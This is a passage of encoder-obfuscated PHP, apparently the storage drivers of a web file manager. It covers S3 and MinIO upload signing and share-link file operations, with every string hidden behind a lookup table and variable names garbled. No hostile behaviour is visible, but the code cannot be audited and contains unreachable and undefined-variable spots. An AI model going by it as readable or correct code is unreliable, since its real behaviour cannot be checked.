$Áôİ×î¸ = hash_hmac($¤„¿‚ÊÙ[277], $Ì”ÇÙé, $¢¶¡óğ¸, !0); $³€©¢”‰ = hash_hmac($¤„¿‚ÊÙ[277], $ñŠ£„óñ, $Áôİ×î¸, !0); $¼ Á«ìÌ = hash_hmac($¤„¿‚ÊÙ[277], $µ´Ööä, $³€©¢”‰); $òŒ«£¢á = array($¤„¿‚ÊÙ[248] => $¤„¿‚ÊÙ[12], $¤„¿‚ÊÙ[272] => $ËîïĞ¸Ô, $¤„¿‚ÊÙ[279] => $µ´Ööä, $¤„¿‚ÊÙ[273] => $£óßÈ¹ı, $¤„¿‚ÊÙ[274] => $ª¾òŒ ¡, $¤„¿‚ÊÙ[275] => $Ëà‡Á“Ö, $¤„¿‚ÊÙ[276] => $ÆÀôÈìë, $¤„¿‚ÊÙ[280] => $¼ Á«ìÌ, $¤„¿‚ÊÙ[258] => $¤„¿‚ÊÙ[249], $¤„¿‚ÊÙ[208] => $this->getHost()); if ($this->_isClientAsync()) { unset($òŒ«£¢á[$¤„¿‚ÊÙ[258]]); } return $òŒ«£¢á; } public function uploadMultiData($ÉŸ”¡ºó, $ŠŒ‚±º = 3600) { $Ù¥ºÁáÎ =& $_SERVER[±Ö‰ô½¯]; $ÆŞ¤®ü¦ = $this->signVer == $Ù¥ºÁáÎ[249] ? gmdate($Ù¥ºÁáÎ[281]) : gmdate($Ù¥ºÁáÎ[282]); $Š›Ã à = array(); $•´ó ù = $this->client->getUploadId($this->bucket, $ÉŸ”¡ºó, $Š›Ã à); if (!$•´ó ù) { return !1; } $¹á‰Ã€É = array($Ù¥ºÁáÎ[283] => $•´ó ù, $Ù¥ºÁáÎ[208] => $this->getHost() . $Ù¥ºÁáÎ[8] . $this->pathEncode($ÉŸ”¡ºó), $Ù¥ºÁáÎ[284] => $ÆŞ¤®ü¦, $Ù¥ºÁáÎ[95] => $ÉŸ”¡ºó, $Ù¥ºÁáÎ[258] => $this->signVer); if ($this->_isClientAsync()) { unset($¹á‰Ã€É[$Ù¥ºÁáÎ[258]]); } return $¹á‰Ã€É; } public function uploadMultiAuth($é« ÁŒ, $ĞÂéÁú° = array()) { $¼õ”½ü¨ =& $_SERVER[±Ö‰ô½¯]; if ($this->signVer == $¼õ”½ü¨[249]) { if (isset($ĞÂéÁú°[$¼õ”½ü¨[285]])) { return $this->uploadPartAuthV2($é« ÁŒ, $ĞÂéÁú°); } return $this->uploadListAuthV2($é« ÁŒ, $ĞÂéÁú°); } if (isset($ĞÂéÁú°[$¼õ”½ü¨[285]])) { return $this->uploadPartAuthV4($é« ÁŒ, $ĞÂéÁú°); } return $this->uploadListAuthV4($é« ÁŒ, $ĞÂéÁú°); } public function uploadPartAuthV2($×â÷ûîÀ, $•µãå† = array()) { $‡ë  =& $_SERVER[±Ö‰ô½¯]; $İæÔ³§Ç = $•µãå†[$‡ë [95]]; $ øÀ¡äù = gmdate($‡ë [281]); $èæç¹û = array_intersect_key($•µãå†, array_flip(array($‡ë [285], $‡ë [283]))); ksort($èæç¹û); $Ğ—ëÏ” = $èæç¹û ? $‡ë [76] . http_build_query($èæç¹û, null, $‡ë [286], PHP_QUERY_RFC3986) : $‡ë [12]; $™­€óÀ² = array($‡ë [255], $‡ë [12], $‡ë [121], $‡ë [12], "\170\55\141\x6d\x7a\x2d\144\141\164\x65\72{$ øÀ¡äù}", $‡ë [8] . $this->bucket . $‡ë [8] . $this->pathEncode($İæÔ³§Ç) . $Ğ—ëÏ”); $Œ±ÄÈ¡Ä = implode($‡ë [287], $™­€óÀ²); $¤ ïœ¶Å = $this->client->__getSignature($Œ±ÄÈ¡Ä); return array($‡ë [288] => $¤ ïœ¶Å, $‡ë [284] => $ øÀ¡äù); } public function uploadListAuthV2($Õßèí€½, $ÂÖ¸½³ = array()) { $µ¸àÜò¦ =& $_SERVER[±Ö‰ô½¯]; $ú¨¯¶Úå = $ÂÖ¸½³[$µ¸àÜò¦[95]]; $¢…”Ó¨ô = $ÂÖ¸½³[$µ¸àÜò¦[283]]; $ ³ûÎ¾ß = $this->client->listParts($this->bucket, $ú¨¯¶Úå, $¢…”Ó¨ô); if (!$ ³ûÎ¾ß) { return !1; } $ï¦äÌ¦Ø = gmdate($µ¸àÜò¦[281]); $ùÇÌ¼—Â = $µ¸àÜò¦[289] . $¢…”Ó¨ô; $İ€¸Ë¢Ò = array($µ¸àÜò¦[290], $µ¸àÜò¦[12], $µ¸àÜò¦[121], $µ¸àÜò¦[12], "\170\x2d\x61\x6d\172\x2d\144\x61\x74\145\x3a{$ï¦äÌ¦Ø}", $µ¸àÜò¦[8] . $this->bucket . $µ¸àÜò¦[8] . $this->pathEncode($ú¨¯¶Úå) . $ùÇÌ¼—Â); $ˆ•ÒÅÑï = implode($µ¸àÜò¦[287], $İ€¸Ë¢Ò); $¼¤¯ÙÙ = $this->client->__getSignature($ˆ•ÒÅÑï); return array($µ¸àÜò¦[288] => $¼¤¯ÙÙ, $µ¸àÜò¦[284] => $ï¦äÌ¦Ø, $µ¸àÜò¦[291] => $ ³ûÎ¾ß); } public function uploadPartAuthV4($š£¬ûğ, $üßÃÕÁ = array()) { $î’ØØ¼Á =& $_SERVER[±Ö‰ô½¯]; $æ¯Óß¯¡ = $üßÃÕÁ[$î’ØØ¼Á[95]]; $óê„ã²ø = array($î’ØØ¼Á[275] => gmdate($î’ØØ¼Á[282]), $î’ØØ¼Á[292] => _get($üßÃÕÁ, $î’ØØ¼Á[293], hash($î’ØØ¼Á[277], $î’ØØ¼Á[12]))); $å…àè÷Ò = explode($î’ØØ¼Á[210], $this->getHost()); $ƒóŸ™Ñ¦ = array($î’ØØ¼Á[294] => $å…àè÷Ò[1], $î’ØØ¼Á[295] => $î’ØØ¼Á[12], $î’ØØ¼Á[248] => $î’ØØ¼Á[121], $î’ØØ¼Á[296] => $üßÃÕÁ[$î’ØØ¼Á[79]]); $ô¨Ò×·æ = $î’ØØ¼Á[255]; $ÉÚãİÍÚ = $î’ØØ¼Á[8] . $this->pathEncode($æ¯Óß¯¡); $¢œóÑ¥Š = array_intersect_key($üßÃÕÁ, array_flip(array($î’ØØ¼Á[285], $î’ØØ¼Á[283]))); $óù¯ğÌç = $this->client->__getSignatureV4($óê„ã²ø, $ƒóŸ™Ñ¦, $ô¨Ò×·æ, $ÉÚãİÍÚ, $¢œóÑ¥Š); return array($î’ØØ¼Á[288] => $óù¯ğÌç, $î’ØØ¼Á[292] => $óê„ã²ø[$î’ØØ¼Á[292]], $î’ØØ¼Á[284] => $óê„ã²ø[$î’ØØ¼Á[275]]); } public function uploadListAuthV4($Š×ÎÏ§³, $³Ùá­ª¥ = array()) { $¤¢¯ß§£ =& $_SERVER[±Ö‰ô½¯]; $ŞÛ¬åí = $³Ùá­ª¥[$¤¢¯ß§£[95]]; $Ÿ«’…şÁ = $³Ùá­ª¥[$¤¢¯ß§£[283]]; $•àÔÆĞ = $this->client->listParts($this->bucket, $ŞÛ¬åí, $Ÿ«’…şÁ); if (!$•àÔÆĞ) { return !1; } $İ‘±©ßª = $¤¢¯ß§£[297]; foreach ($•àÔÆĞ as $Ğï¾¨¸·) { $İ‘±©ßª .= $¤¢¯ß§£[298] . "\x3c\120\141\162\164\116\165\x6d\x62\145\162\76{$Ğï¾¨¸·[$¤¢¯ß§£[299]]}\74\x2f\x50\x61\162\164\116\x75\155\142\145\162\x3e\xa" . "\74\105\x54\x61\x67\76{$Ğï¾¨¸·[$¤¢¯ß§£[300]]}\74\57\x45\x54\141\x67\76\12" . $¤¢¯ß§£[301]; } $İ‘±©ßª .= $¤¢¯ß§£[302]; $®ÄÌ†ó = array($¤¢¯ß§£[275] => gmdate($¤¢¯ß§£[282]), $¤¢¯ß§£[292] => hash($¤¢¯ß§£[277], $İ‘±©ßª)); $ìñ•Í°’ = explode($¤¢¯ß§£[210], $this->getHost()); $Ş÷Ô³É = array($¤¢¯ß§£[294] => $ìñ•Í°’[1], $¤¢¯ß§£[248] => $¤¢¯ß§£[121], $¤¢¯ß§£[296] => strlen($İ‘±©ßª)); $ÀÇ„èòË = $¤¢¯ß§£[290]; $ØŒİêÚç = $¤¢¯ß§£[8] . $this->pathEncode($ŞÛ¬åí); $±ğ´“ó = array($¤¢¯ß§£[283] => $Ÿ«’…şÁ); $äÄœ©ÁÉ = $this->client->__getSignatureV4($®ÄÌ†ó, $Ş÷Ô³É, $ÀÇ„èòË, $ØŒİêÚç, $±ğ´“ó); return array($¤¢¯ß§£[288] => $äÄœ©ÁÉ, $¤¢¯ß§£[292] => $®ÄÌ†ó[$¤¢¯ß§£[292]], $¤¢¯ß§£[284] => $®ÄÌ†ó[$¤¢¯ß§£[275]], $¤¢¯ß§£[291] => $•àÔÆĞ); } private function _isClientAsync() { $úœ‡ğÈà =& $_SERVER[±Ö‰ô½¯]; static $ñõÜ¸°ş = null; if ($ñõÜ¸°ş === null) { $ÕÔı…Àé = isset($_REQUEST[$úœ‡ğÈà[303]]) ? json_decode($_REQUEST[$úœ‡ğÈà[303]], !0) : !1; $ñõÜ¸°ş = $ÕÔı…Àé && _get($ÕÔı…Àé, $úœ‡ğÈà[304]) == $úœ‡ğÈà[305]; } return $ñõÜ¸°ş; } public function getHost() { $‡Â¨û‰é =& $_SERVER[±Ö‰ô½¯]; $ÔÉ£ì—Õ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($‡Â¨û‰é[70], $‡Â¨û‰é[64], $‡Â¨û‰é[69], $‡Â¨û‰é[62]))) { return $ÔÉ£ì—Õ . $‡Â¨û‰é[8] . $this->bucket; } if ($this->osType == $‡Â¨û‰é[62] && !is_domain($ÔÉ£ì—Õ)) { return $ÔÉ£ì—Õ . $‡Â¨û‰é[8] . $this->bucket; } $ÔÉ£ì—Õ = explode($‡Â¨û‰é[210], $ÔÉ£ì—Õ); return $ÔÉ£ì—Õ[0] . $‡Â¨û‰é[210] . $this->bucket . $‡Â¨û‰é[10] . $ÔÉ£ì—Õ[1]; } public function size($¹«ï˜ó) { $ÖÒÎÖ = $this->objectMeta($¹«ï˜ó); return $ÖÒÎÖ ? $ÖÒÎÖ[$_SERVER[±Ö‰ô½¯][79]] : 0; } public function info($•Çˆ±«¬) { if ($this->isFolder($•Çˆ±«¬)) { return $this->folderInfo($•Çˆ±«¬); } else { if ($this->isFile($•Çˆ±«¬)) { return $this->fileInfo($•Çˆ±«¬); } } return !1; } public function exist($É¢ç²™Ó) { return $this->isFile($É¢ç²™Ó) || $this->isFolder($É¢ç²™Ó); } public function isFile($ĞÎÏİ¥·) { return !$this->isFolder($ĞÎÏİ¥·) && $this->objectMeta($ĞÎÏİ¥·); } public function isFolder($¹öÅí†) { return $this->cacheMethod($_SERVER[±Ö‰ô½¯][179], $¹öÅí†); } protected function objectMeta($Æ†§ ¸) { return $this->cacheMethod($_SERVER[±Ö‰ô½¯][181], $Æ†§ ¸); } protected function _objectMeta($ŠŒ¯Ş©¿) { $›£ï†ì¸ =& $_SERVER[±Ö‰ô½¯]; $ŠŒ¯Ş©¿ = rtrim($ŠŒ¯Ş©¿, $›£ï†ì¸[8]); try { $éª’•‚ = $this->client->getObjectInfo($this->bucket, $ŠŒ¯Ş©¿); if (!isset($éª’•‚[$›£ï†ì¸[254]]) && isset($éª’•‚[$›£ï†ì¸[306]])) { $éª’•‚[$›£ï†ì¸[254]] = $éª’•‚[$›£ï†ì¸[306]]; } } catch (Exception $¬¯’Êı) { $éª’•‚ = !1; } if (!$éª’•‚) { } return $éª’•‚; } protected function _isFolder($ÒÜ›ğÂÍ) { $‹Ê†Çåà =& $_SERVER[±Ö‰ô½¯]; $ÒÜ›ğÂÍ = rtrim($ÒÜ›ğÂÍ, $‹Ê†Çåà[8]) . $‹Ê†Çåà[8]; if ($ÒÜ›ğÂÍ == $‹Ê†Çåà[12] || $ÒÜ›ğÂÍ == $‹Ê†Çåà[8]) { return !0; } $ÁùÖîÅï = $this->client->getBucket($this->bucket, $ÒÜ›ğÂÍ, null, 1); if (empty($ÁùÖîÅï[$‹Ê†Çåà[238]])) { return !1; } $òá ¶úÖ = $ÁùÖîÅï[$‹Ê†Çåà[238]][0][$‹Ê†Çåà[32]]; return stripos($òá ¶úÖ, $ÒÜ›ğÂÍ) === 0 ? !0 : !1; if (substr($òá ¶úÖ, -1) == $‹Ê†Çåà[8]) { return !0; } if (get_path_this($òá ¶úÖ) == get_path_this($ÒÜ›ğÂÍ)) { return !1; } return !0; } public function listObject($†ì¼Ş©À) { return $this->fileList($†ì¼Ş©À, $_SERVER[±Ö‰ô½¯][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Â¿ßßÓà) { $Æ¹³¡´á =& $_SERVER[±Ö‰ô½¯]; parent::__construct($Â¿ßßÓà); $this->setSignVersion($Æ¹³¡´á[249]); if (!$this->region) { $this->region = $Æ¹³¡´á[307]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $ ½›ëƒ = $this->getBktRegion(); return $this->region == $ ½›ëƒ ? !0 : !1; } public function uploadFormData($§ƒìó¯˜, $›ÑÖœä = 3600) { $£Ü’®íã =& $_SERVER[±Ö‰ô½¯]; $©¼‰ø¸° = $£Ü’®íã[231]; $­§®Ô¯î = $£Ü’®íã[259]; $¨Â´æáß = $£Ü’®íã[62]; $”°Ú± = gmdate($£Ü’®íã[260]); $¾ö÷­´ö = gmdate($£Ü’®íã[261]); $¬äë×ŞØ = $£Ü’®íã[262]; $òªœ©‹ = $›ÑÖœä . $£Ü’®íã[12]; $áÈƒÚ—› = $£Ü’®íã[263]; $ÈçùÅ˜á = array($this->accessKey, $¾ö÷­´ö, $this->region, $¨Â´æáß, $¬äë×ŞØ); $Ò€à¯”¡ = implode($£Ü’®íã[8], $ÈçùÅ˜á); $„û›àÅÔ = array($£Ü’®íã[264] => gmdate($£Ü’®íã[265], strtotime($£Ü’®íã[266])), $£Ü’®íã[267] => array(array($£Ü’®íã[268] => $this->bucket), array($£Ü’®íã[308] => $©¼‰ø¸°), array($£Ü’®íã[269], $£Ü’®íã[270], $£Ü’®íã[12]), array($£Ü’®íã[269], $£Ü’®íã[271], $£Ü’®íã[12]), array($£Ü’®íã[269], $£Ü’®íã[309], $£Ü’®íã[12]), array($£Ü’®íã[272] => $áÈƒÚ—›), array($£Ü’®íã[273] => $Ò€à¯”¡), array($£Ü’®íã[274] => $­§®Ô¯î), array($£Ü’®íã[275] => $”°Ú±), array($£Ü’®íã[276] => $òªœ©‹))); $£İìŠ¡Ì = base64_encode(json_encode($„û›àÅÔ)); $ÙòÚƒõ˜ = hash_hmac($£Ü’®íã[277], $¾ö÷­´ö, $£Ü’®íã[278] . $this->secret, !0); $›¢ºÚ²¶ = hash_hmac($£Ü’®íã[277], $this->region, $ÙòÚƒõ˜, !0); $æƒÙÂøá = hash_hmac($£Ü’®íã[277], $¨Â´æáß, $›¢ºÚ²¶, !0); $Ğß¦¿îû = hash_hmac($£Ü’®íã[277], $¬äë×ŞØ, $æƒÙÂøá, !0); $¾Üàˆ‚· = hash_hmac($£Ü’®íã[277], $£İìŠ¡Ì, $Ğß¦¿îû); $ãÓ“´ó½ = array($£Ü’®íã[248] => $£Ü’®íã[12], $£Ü’®íã[296] => $£Ü’®íã[12], $£Ü’®íã[308] => $©¼‰ø¸°, $£Ü’®íã[272] => $áÈƒÚ—›, $£Ü’®íã[279] => $£İìŠ¡Ì, $£Ü’®íã[310] => $Ò€à¯”¡, $£Ü’®íã[311] => $­§®Ô¯î, $£Ü’®íã[312] => $”°Ú±, $£Ü’®íã[313] => $òªœ©‹, $£Ü’®íã[314] => $¾Üàˆ‚·, $£Ü’®íã[208] => $this->getHost()); return $ãÓ“´ó½; } } goto a¾‡»ºŞ¬×; aËÊÁ’¥ˆ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($òà¾ÆµŞ) { $this->pathParse = $òà¾ÆµŞ; } protected function infoParse($²½ßıóİ, $ÏÅ¤¾îŠ = false) { $ÇùîÓ¾‘ =& $_SERVER[±Ö‰ô½¯]; return Action($ÇùîÓ¾‘[1309])->sharePathInfo($this->pathParse[$ÇùîÓ¾‘[87]], !0, $ÏÅ¤¾îŠ); } public function listPath($ÚÑáãã”, $“Ì¸èê„ = false) { $¡¤ù¤À =& $_SERVER[±Ö‰ô½¯]; $Òıñ†™ = IO::listPath($ÚÑáãã”, $“Ì¸èê„); if (!$Òıñ†™) { return $Òıñ†™; } if (is_array($Òıñ†™[$¡¤ù¤À[1490]])) { $Ù…©ÇÚ = Action($¡¤ù¤À[1499])->parsePathChildren($Òıñ†™[$¡¤ù¤À[1490]], array($¡¤ù¤À[507] => $ÚÑáãã”)); $Òıñ†™[$¡¤ù¤À[1490]] = Action($¡¤ù¤À[1309])->shareItemInfo($Ù…©ÇÚ); } foreach ($Òıñ†™ as $×ìë¶ç• => $ÃÁ”›Ä) { if (!in_array($×ìë¶ç•, array($¡¤ù¤À[86], $¡¤ù¤À[85]))) { continue; } foreach ($ÃÁ”›Ä as $½÷–šµé => $Ù…©ÇÚ) { $Ù…©ÇÚ = Action($¡¤ù¤À[1499])->parsePathChildren($Ù…©ÇÚ, array($¡¤ù¤À[507] => $ÚÑáãã”)); $Òıñ†™[$×ìë¶ç•][$½÷–šµé] = Action($¡¤ù¤À[1309])->shareItemInfo($Ù…©ÇÚ); } } return $Òıñ†™; } } class PathDriverDriverShareOuter extends PathDriverBase { public function __construct($òÜ¹Ö) { $ëÃâãáö =& $_SERVER[±Ö‰ô½¯]; parent::__construct(); $this->uploadChunkSize = 1024 * 1024 * 2; $this->pathParse = $òÜ¹Ö; $ŠÁèÌÔÀ = Model($ëÃâãáö[684])->getInfo($òÜ¹Ö[$ëÃâãáö[484]]); $é¡Ñ†Ü– = _get($ŠÁèÌÔÀ, $ëÃâãáö[577]); $¨¾’¿á­ = Model($ëÃâãáö[584])->authMake(_get($ŠÁèÌÔÀ, $ëÃâãáö[1500])); if (!$ŠÁèÌÔÀ) { IO::errorTips(LNG($ëÃâãáö[1501]), !1); } if (!$¨¾’¿á­) { IO::errorTips(LNG($ëÃâãáö[1502]), !1); } if ($é¡Ñ†Ü– && is_string($é¡Ñ†Ü–)) { $é¡Ñ†Ü– = json_decode($é¡Ñ†Ü–, !0); } if (!$é¡Ñ†Ü– || !$¨¾’¿á­) { return; } $this->_config = array($ëÃâãáö[1303] => rtrim($òÜ¹Ö[$ëÃâãáö[1303]], $ëÃâãáö[8]) . $ëÃâãáö[8], $ëÃâãáö[1503] => $ëÃâãáö[1410] . $é¡Ñ†Ü–[$ëÃâãáö[1504]] . $ëÃâãáö[496], $ëÃâãáö[573] => $ŠÁèÌÔÀ, $ëÃâãáö[577] => $é¡Ñ†Ü–, $ëÃâãáö[1505] => $¨¾’¿á­, $ëÃâãáö[1506] => substr(APP_HOST, 0, 8) == $ëÃâãáö[219], $ëÃâãáö[1507] => Model($ëÃâãáö[588])->authCheck($¨¾’¿á­[$ëÃâãáö[500]], AuthModel::AUTH_VIEW, !1), $ëÃâãáö[1508] => Model($ëÃâãáö[588])->authCheck($¨¾’¿á­[$ëÃâãáö[500]], AuthModel::AUTH_EDIT, !1)); $this->authToken = $this->requestAuthToken(); } public function allowAction($ëµ£Œ†Ù) { $Ö‡ìä‘¿ =& $_SERVER[±Ö‰ô½¯]; $Á¥¡Š‹â = $this->_config; if (!$Á¥¡Š‹â) { return !1; } $Á± ı–Æ = array($Ö‡ìä‘¿[1509] => $Á¥¡Š‹â[$Ö‡ìä‘¿[1507]], $Ö‡ìä‘¿[1510] => $Á¥¡Š‹â[$Ö‡ìä‘¿[1507]], $Ö‡ìä‘¿[1331] => $Á¥¡Š‹â[$Ö‡ìä‘¿[1507]], $Ö‡ìä‘¿[108] => $Á¥¡Š‹â[$Ö‡ìä‘¿[1508]], $Ö‡ìä‘¿[1511] => $Á¥¡Š‹â[$Ö‡ìä‘¿[1508]], $Ö‡ìä‘¿[1280] => $Á¥¡Š‹â[$Ö‡ìä‘¿[1508]], $Ö‡ìä‘¿[1512] => !1, $Ö‡ìä‘¿[431] => !1, $Ö‡ìä‘¿[1513] => !1, $Ö‡ìä‘¿[1514] => !1); return $Á± ı–Æ[$ëµ£Œ†Ù]; } public function listPath($·¡ôö¢‹, $‹û°àï = false) { return $this->request($_SERVER[±Ö‰ô½¯][1515], array($·¡ôö¢‹)); } public function setContent($‰ŸÆÊÍ™, $­øê¿ÊÔ = '') { return $this->request($_SERVER[±Ö‰ô½¯][1516], array($‰ŸÆÊÍ™, $­øê¿ÊÔ)); } public function getContent($Ö ›í¿¸) { return $this->_fileSubstr($Ö ›í¿¸); } public function fileSubstr($çò³æ‚û, $ı›ÖÊéÂ, $ïé™‚‰æ) { return $this->_fileSubstr($çò³æ‚û, $ı›ÖÊéÂ, $ïé™‚‰æ); } public function download($àõ±¾ğİ, $…ìÄÈ) { return $this->_download($àõ±¾ğİ, $…ìÄÈ); } public function isFileOutServer() { return !1; } public function fileOut($¼Å¾êÛŒ, $­êéĞ¼Ú = false, $‘Ò¹ô“ = false, $ÅÇô¬Ä÷ = '') { $†“à×»Î =& $_SERVER[±Ö‰ô½¯]; $this->fileOutLink($this->_fileLink($¼Å¾êÛŒ, ($ÅÇô¬Ä÷ ? $†“à×»Î[1517] . $ÅÇô¬Ä÷ : $†“à×»Î[12]) . ($­êéĞ¼Ú ? $†“à×»Î[1518] : $†“à×»Î[12]))); } public function fileOutImage($²˜ûñøË, $…»Û–˜— = 250) { $this->fileOutLink($this->_fileLink($²˜ûñøË, $_SERVER[±Ö‰ô½¯][1519] . $…»Û–˜—)); } public function fileOutLink($¦óõòËÉ) { header($_SERVER[±Ö‰ô½¯][174] . $this->urlAuto($¦óõòËÉ)); die; } public function exist($ß¯òüñÉ) { $¨ò‚­ò— = $this->_info($ß¯òüñÉ); return $¨ò‚­ò— ? !0 : !1; } public function isFile($ïôÜ«ËÉ) { $Ø§‚Ø• =& $_SERVER[±Ö‰ô½¯]; $øºëş¶Ó = $this->_info($ïôÜ«ËÉ); return _get($øºëş¶Ó, $Ø§‚Ø•[33], $Ø§‚Ø•[12]) == $Ø§‚Ø•[232]; } public function isFolder($áŸıä‘) { $å“’Ö¼ô =& $_SERVER[±Ö‰ô½¯]; $Â²œö— = $this->_info($áŸıä‘); return _get($Â²œö—, $å“’Ö¼ô[33], $å“’Ö¼ô[12]) == $å“’Ö¼ô[78]; } public function size($åÅÒ Àé) { $‹¢€ÒÚø = $this->_info($åÅÒ Àé); return _get($‹¢€ÒÚø, $_SERVER[±Ö‰ô½¯][79], 0); } public function info($Ì†öÅêâ) { return $this->_info($Ì†öÅêâ); } public function infoAuth($ë¨ ÑÇ) { return $this->_info($ë¨ ÑÇ); } public function infoFull($—©©óªÂ) { return $this->_info($—©©óªÂ); } public function infoFullSimple($úğß•ç) { return $this->_info($úğß•ç); } public function infoWithChildren($ªèğÍÌ€) { return $this->_info($ªèğÍÌ€, !0); } public function has($û™ıÏŒ, $¯Ìˆú÷š = false, $ñ‚€Ä“‘ = false) { $Ù„±Ôôã =& $_SERVER[±Ö‰ô½¯]; $ûı»ü– = $this->_info($û™ıÏŒ); if (!$ûı»ü–) { return !1; } if ($¯Ìˆú÷š) { return array($Ù„±Ôôã[241] => $ûı»ü–[$Ù„±Ôôã[241]], $Ù„±Ôôã[242] => $ûı»ü–[$Ù„±Ôôã[242]]); } return $–½±ò˜Í ? $ûı»ü–[$Ù„±Ôôã[241]] > 0 : $ûı»ü–[$Ù„±Ôôã[242]] > 0; } public function mkfile($ëû”êø˜, $‘ĞÖ¡²¨ = '', $Î°ªûÆ¦ = REPEAT_RENAME) { return $this->request($_SERVER[±Ö‰ô½¯][1492], array($ëû”êø˜, $‘ĞÖ¡²¨, $Î°ªûÆ¦)); } public function mkdir($ÚƒÀÑ“ñ, $äã×úßê = REPEAT_SKIP) { return $this->request($_SERVER[±Ö‰ô½¯][1493], array($ÚƒÀÑ“ñ, $äã×úßê)); } public function remove($–ì‚§ÑÇ) { return $this->request($_SERVER[±Ö‰ô½¯][1280], array($–ì‚§ÑÇ)); } public function rename($Îôö¬„, $ë•Â«°à) { return $this->request($_SERVER[±Ö‰ô½¯][1496], array($Îôö¬„, $ë•Â«°à)); } public function moveSameAllow() { } public function copy($§äÒ„ì¥, $œâ‚¼ÏÑ, $µ°ã‚É = REPEAT_REPLACE, $µÜå²Ø = false) { return $this->request($_SERVER[±Ö‰ô½¯][638], array($§äÒ„ì¥, $œâ‚¼ÏÑ, $µ°ã‚É)); } public function move($„ÇÔšŠ, $å£âÀøí, $‡ã·óû÷ = REPEAT_REPLACE, $Û°º€± = false) { return $this->request($_SERVER[±Ö‰ô½¯][640], array($„ÇÔšŠ, $å£âÀøí, $‡ã·óû÷)); } public function uploadLink($ŠÂ‡‡–­, $¹ë­˜é• = 0) { $È„üÀŒ’ =& $_SERVER[±Ö‰ô½¯]; $ï¦ñ¦ƒ = IO::init($GLOBALS[$È„üÀŒ’[7]][$È„üÀŒ’[87]]); $İÊÂÑ²µ = $this->pathApiEncode($ï¦ñ¦ƒ->path); $®üÍÜóÑ = $this->requestMakeUrl($È„üÀŒ’[1520], array($È„üÀŒ’[87] => $İÊÂÑ²µ)); return array($È„üÀŒ’[1521] => $®üÍÜóÑ); } public function upload($ÅÉöÉ«ƒ, $Î÷ÒÂ, $°¨„šëÇ = false, $¾×ŸĞôø = REPEAT_REPLACE) { $©ö ¾òæ =& $_SERVER[±Ö‰ô½¯]; if (filesize($Î÷ÒÂ) < $this->uploadChunkSize) { return $this->request($©ö ¾òæ[108], array($ÅÉöÉ«ƒ, $Î÷ÒÂ, $¾×ŸĞôø)); } $¡Ó©É – = $this->uploadHashCheck($ÅÉöÉ«ƒ, $Î÷ÒÂ, $¾×ŸĞôø); if ($¡Ó©É –) { return $¡Ó©É –; } $µ¤äİ€ = @filesize($Î÷ÒÂ); $ÖŸäõ­ƒ = $this->uploadChunkSize; $Ï­€Íæ = ceil($µ¤äİ€ / $ÖŸäõ­ƒ); $¯ë¤ÇÕ = 0; while ($¯ë¤ÇÕ < $Ï­€Íæ) { $„…°ş• = IO::fileSubstr($Î÷ÒÂ, $¯ë¤ÇÕ * $ÖŸäõ­ƒ, $ÖŸäõ­ƒ); $„“Õ©²ò = $this->tempFile($©ö ¾òæ[12], $„…°ş•); $¨îõØÄß = array($©ö ¾òæ[79] => $µ¤äİ€, $©ö ¾òæ[1522] => $ÖŸäõ­ƒ, $©ö ¾òæ[1523] => $Ï­€Íæ, $©ö ¾òæ[1524] => $¯ë¤ÇÕ); $ÚÀ¿©“« = $this->uploadSend($ÅÉöÉ«ƒ, $„“Õ©²ò, $¨îõØÄß, $¾×ŸĞôø); $¯ë¤ÇÕ++; if (!$ÚÀ¿©“«) { return !1; } } if (!is_array($ÚÀ¿©“«) || empty($ÚÀ¿©“«[$©ö ¾òæ[592]])) { return !1; } return $this->pathApiDecode($ÚÀ¿©“«[$©ö ¾òæ[592]]); } private function uploadHashCheck($Ç‡ä¶áé, $„Íã¡ÍŸ, $­»ªŞ) { $ÚÏ³Œ·ß =& $_SERVER[±Ö‰ô½¯]; $ªŠ¢”¼ = IO::hashSimple($„Íã¡ÍŸ); $±òòº¬² = array($ÚÏ³Œ·ß[1525] => $ÚÏ³Œ·ß[1526], $ÚÏ³Œ·ß[1484] => $ªŠ¢”¼); $¯‰ƒç·ç = $this->uploadSend($Ç‡ä¶áé, $ÚÏ³Œ·ß[12], $±òòº¬², $­»ªŞ); $¬Ç²Êê = _get($¯‰ƒç·ç, $ÚÏ³Œ·ß[592], array()); $şë‹‚Ô = _get($¬Ç²Êê, $ÚÏ³Œ·ß[1527]); if (!is_array($şë‹‚Ô) || !$şë‹‚Ô[$ÚÏ³Œ·ß[560]]) { return !1; } $Ê¿‘º‹Š = IO::hashMd5($„Íã¡ÍŸ); if ($şë‹‚Ô[$ÚÏ³Œ·ß[560]] != $Ê¿‘º‹Š) { return !1; } if ($¯‰ƒç·ç[$ÚÏ³Œ·ß[592]][$ÚÏ³Œ·ß[1528]]) { $this->uploadChunkSize = $¯‰ƒç·ç[$ÚÏ³Œ·ß[592]][$ÚÏ³Œ·ß[1528]]; } $±òòº¬² = array($ÚÏ³Œ·ß[1525] => $ÚÏ³Œ·ß[1529], $ÚÏ³Œ·ß[1485] => $Ê¿‘º‹Š, $ÚÏ³Œ·ß[1484] => $ªŠ¢”¼); $¯‰ƒç·ç = $this->uploadSend($Ç‡ä¶áé, $ÚÏ³Œ·ß[12], $±òòº¬², $­»ªŞ); if (!is_array($¯‰ƒç·ç) || empty($¯‰ƒç·ç[$ÚÏ³Œ·ß[592]])) { return !1; } return $this->pathApiDecode($¯‰ƒç·ç[$ÚÏ³Œ·ß[592]]); } private function uploadSend($”˜¡÷¤¯, $ØÁæ¾û±, $µµ»–¸ƒ, $ó¿‡š÷ø = '') { $Ëòœ·œ =& $_SERVER[±Ö‰ô½¯]; $µµ»–¸ƒ[$Ëòœ·œ[32]] = get_path_this($”˜¡÷¤¯); $µµ»–¸ƒ[$Ëòœ·œ[87]] = $this->pathApiEncode(get_path_father($”˜¡÷¤¯)); if ($ó¿‡š÷ø) { $µµ»–¸ƒ[$Ëòœ·œ[1530]] = $ó¿‡š÷ø; } if ($ØÁæ¾û±) { $µµ»–¸ƒ[$Ëòœ·œ[232]] = $Ëòœ·œ[1345] . $ØÁæ¾û±; } return $this->requestSend($Ëòœ·œ[1520], $µµ»–¸ƒ); } protected function pathApiEncode($Î“‡Äı±) { $¦àşÉôš =& $_SERVER[±Ö‰ô½¯]; $ëÀË—áø = 